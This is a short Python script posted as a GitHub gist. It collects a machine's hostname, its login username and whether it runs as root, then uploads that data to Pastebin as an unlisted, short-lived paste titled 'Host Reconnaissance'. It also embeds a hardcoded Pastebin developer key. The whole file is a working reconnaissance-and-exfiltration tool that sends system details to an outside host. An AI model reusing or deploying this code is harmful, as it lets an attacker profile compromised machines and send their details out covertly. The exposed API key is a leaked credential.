#date: 2021-12-13T17:13:47Z
#url: https://api.github.com/gists/666f62cc3e54145298c65ed38c5b9d81
#owner: https://api.github.com/users/cocatrip

import os
import sys
import requests

def getInfo():
    hostname = os.uname()[1]
    username = os.getlogin()
    if os.getuid() == 0:
        privilege = "root"
    else:
        privilege = "user"
    return hostname, username, privilege

def printInfo(hostname, username, privilege):
    print("Hostname: " + hostname)
    print("Username: " + username)
    if privilege == 0:
        print("Privilege: root")
    else:
        print("Privilege: user")

def uploadInfo(hostname, username, privilege):
    login_url = 'https://pastebin.com/api/api_login.php'
    login_data = {
        'api_dev_key': '', # your devkey
        'api_user_name': '', # your username
        'api_user_password': '' # your password
    }
    r = requests.post(login_url, data=login_data)
    print(r.text)

    url = "https://pastebin.com/api/api_post.php"
    data = {
        "api_dev_key": "mtQXPNFGKeCqiTZ4h3psmuaUnli6nJhd",
        "api_user_key": r.text,
        "api_option": "paste",
        "api_paste_code": "Hostname: " + hostname + "\nUsername: " + username + "\nPrivilege: " + str(privilege),
        "api_paste_name": "Host Reconnaissance",
        "api_paste_private": "1",
        "api_paste_expire_date": "10M"
    }
    r = requests.post(url, data=data)
    print(r.text)

uploadInfo(*getInfo())